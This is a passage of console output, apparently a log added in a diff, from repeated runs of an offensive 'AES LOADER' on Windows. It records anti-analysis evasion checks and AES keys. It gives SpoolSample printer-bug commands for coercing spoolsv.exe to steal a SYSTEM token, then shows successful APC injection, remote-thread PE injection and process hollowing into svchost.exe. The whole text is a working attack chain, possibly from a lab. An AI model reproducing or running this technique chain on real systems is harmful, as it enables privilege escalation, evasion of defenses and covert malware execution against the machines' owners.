+[*] Allocating memory...
+[+] Memory allocated at: 0x140000000
+[*] Writing PE headers...
+[*] Writing sections...
+[+] Section written
+[+] Section written
+[+] Section written
+[+] Section written
+[+] Section written
+[*] Creating remote thread at entry point...
+[+] Remote thread created at: 0x140005000
+[+] Thread exit code: 259
+[+] PE injection complete
+[+] SUCCESS
+PS C:\Windows\Tasks> .\loader.exe -i -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 4107ms
+[+] Sleep timing check passed (4113ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Default mode: spawning C:\Windows\System32\svchost.exe + APC injection...
+[*] With SeImpersonate escalation...
+[*] Generated random pipe name (UUID):
+    95309514-9c0d-49b5-a9fc-c67cb57adf4b
+[*] CreateNamedPipe() details:
+    Pipe name: \\\.\pipe\95309514-9c0d-49b5-a9fc-c67cb57adf4b\pipe\spoolss
+    Access mode: PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
+    Pipe mode: PIPE_TYPE_BYTE | PIPE_WAIT
+    Max instances: 10
+    Buffer sizes: 2048 bytes (in/out)
+[+] CreateNamedPipeW() successful
+    Pipe handle: 0x218
+[+] Named pipe listening...
+[*] Printer bug trigger instructions:
+
+========== RPC COERCION - SPOOLSAMPLE TRIGGER ==========
+Run this command from attacker machine:
+
+SpoolSample.exe appsrv01 appsrv01/pipe/95309514-9c0d-49b5-a9fc-c67cb57adf4b
+
+Details:
+  - Target: appsrv01
+  - Pipe: \\appsrv01\pipe\95309514-9c0d-49b5-a9fc-c67cb57adf4b
+  - Triggers: RpcOpenPrinter() -> RpcRemoteFindFirstPrinterChangeNotificationEx()
+  - spoolsv.exe (SYSTEM) will connect to our named pipe
+  - We impersonate and steal SYSTEM token
+==========================================================
+
+[*] Timeout with jitter: 34903ms
+[*] Waiting for spoolsv.exe connection (timeout: 34903ms)...
+[-] Timeout waiting for pipe connection
+[-] Timeout or error waiting for pipe connection
+[-] spoolsv.exe did not connect within 34903ms
+[-] Escalation FAILED
+PS C:\Windows\Tasks> .\loader.exe -i -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 3197ms
+[+] Sleep timing check passed (3209ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Default mode: spawning C:\Windows\System32\svchost.exe + APC injection...
+[*] With SeImpersonate escalation...
+[*] Generated random pipe name (UUID):
+    06d617e6-a799-4e11-9b4d-02dfcdb403c6
+[*] CreateNamedPipe() details:
+    Pipe name: \\\.\pipe\06d617e6-a799-4e11-9b4d-02dfcdb403c6\pipe\spoolss
+    Access mode: PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
+    Pipe mode: PIPE_TYPE_BYTE | PIPE_WAIT
+    Max instances: 10
+    Buffer sizes: 2048 bytes (in/out)
+[+] CreateNamedPipeW() successful
+    Pipe handle: 0x218
+[+] Named pipe listening...
+[*] Printer bug trigger instructions:
+
+========== RPC COERCION - SPOOLSAMPLE TRIGGER ==========
+Run this command from attacker machine:
+
+SpoolSample.exe appsrv01 appsrv01/pipe/06d617e6-a799-4e11-9b4d-02dfcdb403c6
+
+Details:
+  - Target: appsrv01
+  - Pipe: \\appsrv01\pipe\06d617e6-a799-4e11-9b4d-02dfcdb403c6
+  - Triggers: RpcOpenPrinter() -> RpcRemoteFindFirstPrinterChangeNotificationEx()
+  - spoolsv.exe (SYSTEM) will connect to our named pipe
+  - We impersonate and steal SYSTEM token
+==========================================================
+
+[*] Timeout with jitter: 27343ms
+[*] Waiting for spoolsv.exe connection (timeout: 27343ms)...
+[+] Connection received on named pipe!
+[+] Token impersonated successfully
+[+] Token User SID:
+    S-1-5-18
+[+] Confirmed: SYSTEM (NT AUTHORITY\SYSTEM)
+[+] Escalation successful! Got SYSTEM token
+[+] C:\Windows\System32\svchost.exe spawned: PID 5164
+
+[*] Smart injection - detecting payload type...
+[*] Detected: PE payload
+[*] Parsing PE header...
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[+] Payload EntryPoint: 0x5000
+[*] Opening target process PID 5164...
+[+] Process opened
+[*] Allocating memory...
+[+] Memory allocated at: 0x140000000
+[*] Writing PE headers...
+[*] Writing sections...
+[+] Section written
+[+] Section written
+[+] Section written
+[+] Section written
+[+] Section written
+[*] Creating remote thread at entry point...
+[+] Remote thread created at: 0x140005000
+[+] Thread exit code: 259
+[+] PE injection complete
+[+] SUCCESS
+PS C:\Windows\Tasks> .\loader.exe -i -m hollow -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 4261ms
+[+] Sleep timing check passed (4274ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Hollowing mode (target: C:\Windows\System32\svchost.exe)...
+[*] With SeImpersonate escalation...
+[*] Generated random pipe name (UUID):
+    298140d2-012d-47eb-a25b-205717df016b
+[*] CreateNamedPipe() details:
+    Pipe name: \\\.\pipe\298140d2-012d-47eb-a25b-205717df016b\pipe\spoolss
+    Access mode: PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
+    Pipe mode: PIPE_TYPE_BYTE | PIPE_WAIT
+    Max instances: 10
+    Buffer sizes: 2048 bytes (in/out)
+[+] CreateNamedPipeW() successful
+    Pipe handle: 0x218
+[+] Named pipe listening...
+[*] Printer bug trigger instructions:
+
+========== RPC COERCION - SPOOLSAMPLE TRIGGER ==========
+Run this command from attacker machine:
+
+SpoolSample.exe appsrv01 appsrv01/pipe/298140d2-012d-47eb-a25b-205717df016b
+
+Details:
+  - Target: appsrv01
+  - Pipe: \\appsrv01\pipe\298140d2-012d-47eb-a25b-205717df016b
+  - Triggers: RpcOpenPrinter() -> RpcRemoteFindFirstPrinterChangeNotificationEx()
+  - spoolsv.exe (SYSTEM) will connect to our named pipe
+  - We impersonate and steal SYSTEM token
+==========================================================
+
+[*] Timeout with jitter: 27452ms
+[*] Waiting for spoolsv.exe connection (timeout: 27452ms)...
+[+] Connection received on named pipe!
+[+] Token impersonated successfully
+[+] Token User SID:
+    S-1-5-18
+[+] Confirmed: SYSTEM (NT AUTHORITY\SYSTEM)
+[+] Escalation successful! Got SYSTEM token
+[*] Parsing payload PE header...
+[+] Payload architecture: x64
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[*] Creating suspended process...
+[+] Process created: PID 2376
+[+] Target PEB: 0xafd2f9000
+[+] Target ImageBase: 0x7ff76c660000
+[+] Memory allocated at: 0x140000000
+[*] Writing PE headers...
+[*] Writing sections...
+[+] Section .text written
+[+] Section .rdata written
+[+] Section .data written
+[+] Section .pdata written
+[+] Section .gkec written
+[*] Updating PEB...
+[+] Thread context updated (RCX = 0x140005000)
+[*] Resuming thread...
+[+] Process hollowing complete!
+[+] SUCCESS
+PS C:\Windows\Tasks> .\loader.exe -i -m apc -p 2392 -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 3070ms
+[+] Sleep timing check passed (3071ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] APC injection mode with SeImpersonate escalation (PID 2392)...
+[*] Generated random pipe name (UUID):
+    6d5c13a2-86af-4174-a1c1-601ad5088c1a
+[*] CreateNamedPipe() details:
+    Pipe name: \\\.\pipe\6d5c13a2-86af-4174-a1c1-601ad5088c1a\pipe\spoolss
+    Access mode: PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
+    Pipe mode: PIPE_TYPE_BYTE | PIPE_WAIT
+    Max instances: 10
+    Buffer sizes: 2048 bytes (in/out)
+[+] CreateNamedPipeW() successful
+    Pipe handle: 0x218
+[+] Named pipe listening...
+[*] Printer bug trigger instructions:
+
+========== RPC COERCION - SPOOLSAMPLE TRIGGER ==========
+Run this command from attacker machine:
+
+SpoolSample.exe appsrv01 appsrv01/pipe/6d5c13a2-86af-4174-a1c1-601ad5088c1a
+
+Details:
+  - Target: appsrv01
+  - Pipe: \\appsrv01\pipe\6d5c13a2-86af-4174-a1c1-601ad5088c1a
+  - Triggers: RpcOpenPrinter() -> RpcRemoteFindFirstPrinterChangeNotificationEx()
+  - spoolsv.exe (SYSTEM) will connect to our named pipe
+  - We impersonate and steal SYSTEM token
+==========================================================
+
+[*] Timeout with jitter: 27975ms
+[*] Waiting for spoolsv.exe connection (timeout: 27975ms)...
+[+] Connection received on named pipe!
+[+] Token impersonated successfully
+[+] Token User SID:
+    S-1-5-18
+[+] Confirmed: SYSTEM (NT AUTHORITY\SYSTEM)
+[+] Escalation successful! Got SYSTEM token
+
+[*] Smart injection - detecting payload type...
+[*] Detected: PE payload
+[*] Parsing PE header...
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[+] Payload EntryPoint: 0x5000
+[*] Opening target process PID 2392...
+[+] Process opened
+[*] Allocating memory...
+[+] Memory allocated at: 0x140000000
+[*] Writing PE headers...
+[*] Writing sections...
+[+] Section written
+[+] Section written
+[+] Section written
+[+] Section written
+[+] Section written
+[*] Creating remote thread at entry point...
+[+] Remote thread created at: 0x140005000
+[+] Thread exit code: 259
+[+] PE injection complete
+[+] SUCCESS
+PS C:\Windows\Tasks> .\loader.exe -i -m hollow -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 3201ms
+[+] Sleep timing check passed (3201ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Hollowing mode (target: C:\Windows\System32\svchost.exe)...
+[*] With SeImpersonate escalation...
+[*] Generated random pipe name (UUID):
+    46d08af8-72ec-41c2-b805-ec197a869745
+[*] CreateNamedPipe() details:
+    Pipe name: \\\.\pipe\46d08af8-72ec-41c2-b805-ec197a869745\pipe\spoolss
+    Access mode: PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
+    Pipe mode: PIPE_TYPE_BYTE | PIPE_WAIT
+    Max instances: 10
+    Buffer sizes: 2048 bytes (in/out)
+[+] CreateNamedPipeW() successful
+    Pipe handle: 0x218
+[+] Named pipe listening...
+[*] Printer bug trigger instructions:
+
+========== RPC COERCION - SPOOLSAMPLE TRIGGER ==========
+Run this command from attacker machine:
+
+SpoolSample.exe appsrv01 appsrv01/pipe/46d08af8-72ec-41c2-b805-ec197a869745
+
+Details:
+  - Target: appsrv01
+  - Pipe: \\appsrv01\pipe\46d08af8-72ec-41c2-b805-ec197a869745
+  - Triggers: RpcOpenPrinter() -> RpcRemoteFindFirstPrinterChangeNotificationEx()
+  - spoolsv.exe (SYSTEM) will connect to our named pipe
+  - We impersonate and steal SYSTEM token
+==========================================================
+
+[*] Timeout with jitter: 33212ms
+[*] Waiting for spoolsv.exe connection (timeout: 33212ms)...
+[+] Connection received on named pipe!
+[+] Token impersonated successfully
+[+] Token User SID:
+    S-1-5-18
+[+] Confirmed: SYSTEM (NT AUTHORITY\SYSTEM)
+[+] Escalation successful! Got SYSTEM token
+[*] Parsing payload PE header...
+[+] Payload architecture: x64
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[*] Creating suspended process...
+[+] Process created: PID 5340
+[+] Target PEB: 0xa136e71000
+[+] Target ImageBase: 0x7ff76c660000
+[+] Memory allocated at: 0x140000000
+[*] Writing PE headers...
+[*] Writing sections...
+[+] Section .text written
+[+] Section .rdata written
+[+] Section .data written
+[+] Section .pdata written
+[+] Section .gkec written
+[*] Updating PEB...
+[+] Thread context updated (RCX = 0x140005000)
+[*] Resuming thread...
+[+] Process hollowing complete!
+[+] SUCCESS
+PS C:\Windows\Tasks> .\loader.exe -i -v
+
+=== AES LOADER ===
+
+=== ANTI-ANALYSIS CHECKS ===
+[*] Checking virtualization...
+[+] Virtualization check passed
+[*] Checking sleep timing...
+[*] Sleep time: 3173ms
+[+] Sleep timing check passed (3179ms)
+[+] All checks passed
+
+[+] seed: 6e74cb6fe348e651dc8302e77d9f11928ce594876a0ceb8e3ac9b6195db67c580cec70fdd25d9a753e8b
+[+] key: 11c5f58baadded2692abba639f13577f43ce7e18851a8f2373605b43a1bfa5f8
+[+] iv: bfac0f9d93e9a9f7d45f36e7e10d18cc
+
+[+] Default process: C:\Windows\System32\svchost.exe
+[+] Payload: 7680 bytes
+[+] Header: 4d5a90000300000004000000ffff0000
+
+[*] Default mode: spawning C:\Windows\System32\svchost.exe + APC injection...
+[*] With SeImpersonate escalation...
+[*] Generated random pipe name (UUID):
+    d5751089-c797-496b-8871-e1079a68e87d
+[*] CreateNamedPipe() details:
+    Pipe name: \\\.\pipe\d5751089-c797-496b-8871-e1079a68e87d\pipe\spoolss
+    Access mode: PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
+    Pipe mode: PIPE_TYPE_BYTE | PIPE_WAIT
+    Max instances: 10
+    Buffer sizes: 2048 bytes (in/out)
+[+] CreateNamedPipeW() successful
+    Pipe handle: 0x218
+[+] Named pipe listening...
+[*] Printer bug trigger instructions:
+
+========== RPC COERCION - SPOOLSAMPLE TRIGGER ==========
+Run this command from attacker machine:
+
+SpoolSample.exe appsrv01 appsrv01/pipe/d5751089-c797-496b-8871-e1079a68e87d
+
+Details:
+  - Target: appsrv01
+  - Pipe: \\appsrv01\pipe\d5751089-c797-496b-8871-e1079a68e87d
+  - Triggers: RpcOpenPrinter() -> RpcRemoteFindFirstPrinterChangeNotificationEx()
+  - spoolsv.exe (SYSTEM) will connect to our named pipe
+  - We impersonate and steal SYSTEM token
+==========================================================
+
+[*] Timeout with jitter: 34643ms
+[*] Waiting for spoolsv.exe connection (timeout: 34643ms)...
+[+] Connection received on named pipe!
+[+] Token impersonated successfully
+[+] Token User SID:
+    S-1-5-18
+[+] Confirmed: SYSTEM (NT AUTHORITY\SYSTEM)
+[+] Escalation successful! Got SYSTEM token
+[+] C:\Windows\System32\svchost.exe spawned: PID 1768
+
+[*] Smart injection - detecting payload type...
+[*] Detected: PE payload
+[*] Parsing PE header...
+[+] Payload ImageBase: 0x140000000
+[+] Payload SizeOfImage: 0x53c0
+[+] Payload EntryPoint: 0x5000
+[*] Opening target process PID 1768...
+[+] Process opened
+[*] Allocating memory...
+[+] Memory allocated at: 0x140000000
+[*] Writing PE headers...
+[*] Writing sections...
+[+] Section written
+[+] Section written
+[+] Section written
+[+] Section written
+[+] Section written
+[*] Creating remote thread at entry point...
+[+] Remote thread created at: 0x140005000
+[+] Thread exit code: 259
+[+] PE injection complete
+[+] SUCCESS
+PS C:\Windows\Tasks>
